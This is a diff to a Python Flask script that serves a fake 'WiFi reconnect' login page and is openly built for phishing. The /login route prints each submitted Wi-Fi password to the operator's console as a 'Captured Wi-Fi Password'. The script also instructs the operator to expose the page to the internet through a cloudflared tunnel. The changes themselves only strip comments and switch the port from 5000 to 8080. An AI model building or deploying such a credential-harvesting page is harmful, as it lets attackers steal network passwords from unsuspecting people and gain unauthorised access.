@@ -21,7 +21,6 @@ def redirect_to_youtube():
     os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
     input("\n\033[1;32m[✔] After subscribing, press Enter to continue...\033[0m\n")
 
-# ✅ Realistic frozen WiFi reconnect page
 login_page = r'''
 <!DOCTYPE html>
 <html>
@@ -96,7 +95,6 @@ login_page = r'''
         }
     </style>
     <script>
-        // Disable everything except typing
         document.addEventListener('keydown', function(e) {
             const allowed = ['Backspace', 'Tab', 'Enter', 'Shift', 'ArrowLeft', 'ArrowRight'];
             if (!allowed.includes(e.key) && !e.key.match(/^[a-zA-Z0-9!@#\$%\^&\*\(\)_\+\-=]$/)) {
@@ -141,9 +139,7 @@ def index():
 @app.route('/login', methods=['POST'])
 def login():
     password = request.form.get('password')
-
     print(f"\n\033[1;36m[📶] Captured Wi-Fi Password:\033[0m \033[1;31m{password}\033[0m\n")
-
     return '''
     <script>alert("Reconnecting...");</script>
     <h2 style="text-align:center; color:white; background:black; padding:30px;">
@@ -153,7 +149,7 @@ def login():
 
 if __name__ == '__main__':
     redirect_to_youtube()
-    print("\n\033[1;32m[✔] Flask server running on http://127.0.0.1:5000\033[0m")
-    print("\033[1;34m[>] Open a new tab and run:\033[0m")
-    print("\033[1;36m    cloudflared tunnel --url http://127.0.0.1:5000\033[0m\n")
-    app.run(host='127.0.0.1', port=5000)
+    print("\n\033[1;32m[✔] Flask server running on http://127.0.0.1:8080\033[0m")
+    print("\033[1;34m[>] In a new tab, run:\033[0m")
+    print("\033[1;36m    cloudflared tunnel --url http://127.0.0.1:8080\033[0m\n")
+    app.run(host='127.0.0.1', port=8080)
